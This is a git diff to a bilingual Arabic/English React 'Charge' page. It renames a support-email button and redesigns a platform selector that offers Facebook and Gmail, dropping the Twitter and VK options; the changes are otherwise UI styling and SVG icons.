@@ -233,7 +233,7 @@ export default function Charge() {
                 className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
               >
                 <Mail className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
-                {language === 'ar' ? 'بريد الخادم' : 'Server Email'}
+                {language === 'ar' ? 'البريد المساعد' : 'Support Email'}
               </button>
               <button 
                 onClick={() => { setIsSidebarOpen(false); navigate('/search-id'); }}
@@ -418,7 +418,40 @@ export default function Charge() {
             <h2 className="text-xl font-black text-gray-800">{t('account_info')}</h2>
           </div>
 
-          <div className="space-y-5">
+          <div className="space-y-6">
+            
+            {/* Eye-Catching Platform Selection */}
+            <div className="rounded-2xl border-2 border-blue-100 bg-blue-50/30 p-3 sm:p-4 shadow-sm mx-auto w-fit">
+              <label className="block text-center text-sm font-black text-blue-900 mb-3">
+                {language === 'ar' ? 'اختر نوع المنصة الرئيسية' : 'Choose Main Platform Type'}
+              </label>
+              <div className="flex gap-4 justify-center">
+                {["facebook", "gmail"].map((p) => (
+                  <button
+                    key={p}
+                    onClick={() => setPlatform(p)}
+                    className={`group relative flex h-16 w-16 items-center justify-center rounded-2xl transition-all duration-300 ${platform === p ? "bg-white shadow-[0_8px_30px_rgb(0,0,0,0.12)] scale-110 -translate-y-2 ring-2 ring-blue-500 ring-offset-2" : "bg-white border text-gray-400 border-blue-100/50 hover:bg-gray-50 hover:border-blue-300 hover:shadow-md"}`}
+                  >
+                    {platform === p && (
+                      <div className="absolute -top-2 -right-2 bg-blue-500 text-white rounded-full p-1 shadow-sm">
+                        <Check className="w-3 h-3" />
+                      </div>
+                    )}
+                    {p === "facebook" && (
+                      <div className={`flex h-10 w-10 items-center justify-center rounded-xl text-white transition-colors ${platform === p ? 'bg-[#1877F2]' : 'bg-[#1877F2]/80 group-hover:bg-[#1877F2]'}`}>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" /></svg>
+                      </div>
+                    )}
+                    {p === "gmail" && (
+                      <div className={`flex h-10 w-10 items-center justify-center rounded-xl bg-white border border-gray-100 transition-all ${platform === p ? 'shadow-sm' : 'opacity-80 group-hover:opacity-100'}`}>
+                        <svg width="24" height="24" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+                      </div>
+                    )}
+                  </button>
+                ))}
+              </div>
+            </div>
+
             <div className="grid gap-4 md:grid-cols-2">
               <div className="flex flex-col gap-1 w-full">
                 <input
@@ -465,76 +498,6 @@ export default function Charge() {
                 <div className={`pointer-events-none absolute ${language === 'ar' ? 'left-4' : 'right-4'} top-1/2 -translate-y-1/2 text-gray-500`}>
                   <ChevronDown className="h-5 w-5" />
                 </div>
-              </div>
-            </div>
-
-            <div className="space-y-3">
-              <label className="block text-sm font-bold text-gray-700">
-                {language === 'ar' ? 'اختر نوع المنصة الرئيسية' : 'Choose Main Platform Type'}
-                <Info className={`inline h-4 w-4 text-gray-400 ${language === 'ar' ? 'mr-2' : 'ml-2'}`} />
-              </label>
-              <div className="flex gap-3 justify-center md:justify-start flex-wrap">
-                {["facebook", "gmail", "twitter", "vk"].map((p) => (
-                  <button
-                    key={p}
-                    onClick={() => setPlatform(p)}
-                    className={`flex h-12 w-12 items-center justify-center rounded-full transition-all border-2 ${platform === p ? "border-blue-600 scale-110 shadow-md" : "border-transparent bg-gray-50 hover:bg-gray-100"}`}
-                  >
-                    {p === "facebook" && (
-                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#1877F2] text-white">
-                        <svg
-                          width="20"
-                          height="20"
-                          viewBox="0 0 24 24"
-                          fill="currentColor"
-                          stroke="none"
-                        >
-                          <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.469h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.469h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
-                        </svg>
-                      </div>
-                    )}
-                    {p === "twitter" && (
-                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-black text-white">
-                        <svg
-                          width="18"
-                          height="18"
-                          viewBox="0 0 24 24"
-                          fill="currentColor"
-                          stroke="none"
-                        >
-                          <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
-                        </svg>
-                      </div>
-                    )}
-                    {p === "gmail" && (
-                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-white border border-gray-200">
-                        <svg width="20" height="20" viewBox="0 0 48 48">
-                          <path
-                            fill="#EA4335"
-                            d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
-                          />
-                          <path
-                            fill="#4285F4"
-                            d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
-                          />
-                          <path
-                            fill="#FBBC05"
-                            d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
-                          />
-                          <path
-                            fill="#34A853"
-                            d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
-                          />
-                        </svg>
-                      </div>
-                    )}
-                    {p === "vk" && (
-                      <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#0077FF] text-white">
-                        <span className="font-bold text-sm">VK</span>
-                      </div>
-                    )}
-                  </button>
-                ))}
               </div>
             </div>
           </div>
